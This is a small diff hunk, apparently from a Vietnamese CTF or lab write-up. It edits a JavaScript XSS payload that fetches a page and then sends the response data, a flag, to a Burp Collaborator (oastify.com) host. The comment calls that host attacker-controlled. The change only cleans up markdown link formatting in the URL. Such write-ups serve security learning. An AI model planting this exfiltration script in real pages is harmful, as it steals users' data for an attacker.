@@ -47,7 +47,7 @@ Ta viết một đoạn mã JavaScript thực hiện 2 hành động liên tiế
     .then(response => response.text())
     .then(data => {
         // Bước 2: Tuồn dữ liệu ra máy chủ do attacker kiểm soát (Burp Collaborator)
-        let exfilUrl = '[https://gl5wliclr8yyax0z7pwct8oay14ssjg8.oastify.com/?flag=](https://gl5wliclr8yyax0z7pwct8oay14ssjg8.oastify.com/?flag=)' + encodeURIComponent(data);
+        let exfilUrl = 'https://gl5wliclr8yyax0z7pwct8oay14ssjg8.oastify.com/?flag' + encodeURIComponent(data);
         fetch(exfilUrl);
     });
 </script>
